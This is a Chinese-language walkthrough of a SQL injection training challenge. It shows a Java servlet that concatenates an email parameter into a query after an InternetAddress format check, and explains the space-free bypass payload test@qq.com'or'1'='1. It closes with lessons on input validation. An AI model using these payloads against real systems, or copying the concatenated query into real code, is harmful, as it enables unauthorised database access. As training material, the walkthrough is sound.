#   SQL Injection Challenge Two(SQL注入挑战 2)

## 题介绍
需要利用一个SQL注入点，获得通关密钥 

## 功能实现 

点击查询用户,获得对应请求  
```
POST /challenges/ffd39cb26727f34cbf9fce3e82b9d703404e99cdef54d2aa745f497abe070b HTTP/1.1


userIdentity=test%40qq.com%22+or+%221%22%3D%221
```

对应代码文件 src/main/java/servlets/module/challenge/SqlInjectionEmail.java  

```
String userIdentity = request.getParameter("userIdentity");
log.debug("User Submitted - " + userIdentity);
if(Validate.isValidEmailAddress(userIdentity))
{
	log.debug("Filtered to " + userIdentity);
	String ApplicationRoot = getServletContext().getRealPath("");
	log.debug("Servlet root = " + ApplicationRoot );
	
	log.debug("Getting Connection to Database");
	Connection conn = Database.getChallengeConnection(ApplicationRoot, "SqlChallengeEmail");
	Statement stmt = conn.createStatement();
	log.debug("Gathering result set");
	ResultSet resultSet = stmt.executeQuery("SELECT * FROM customers WHERE customerAddress = '" + userIdentity + "'");
```

获得 userIdentity 参数后，进行了SQL查询，但中间调用Validate.isValidEmailAddress 进行了一次对参数过滤，判断是否是合法的邮箱地址 ，详细代码如下   

```
	public static boolean isValidEmailAddress(String email) 
	{
	   boolean result = true;
	   try 
	   {
		  log.debug("About to crash");
	      InternetAddress emailAddr = new InternetAddress(email);
	      log.debug("Did we crash");
	      emailAddr.validate();
	      log.debug("Didn't crash");
	   } 
	   catch (AddressException ex)
	   {
	      result = false;
	   }
	   return result;
	}
```

通过InternetAddress 类进行判断的，因此要想成功注入获取结果，首先要绕过InternetAddress类的检测，经过测试该类不允许邮箱地址存在空格


## 解题步骤  

不能输入空格，可以使用很多方法绕过检测 如 test@qq.com'or'1'='1 ，最终执行的SQL变成   
```
SELECT * FROM customers WHERE customerAddress = 'test@qq.com'or'1'='1'  
```

## 总结  

在开发指南中，我们经常要求进行输入验证，但本题做了输入验证，仍然存在安全漏洞，说明能够实现正确的输入验证并非易事   
对于普通的研发人员，白名单+黑名单的方式可能更简单，比如本题进一步不允许输入单引号等特殊字符  


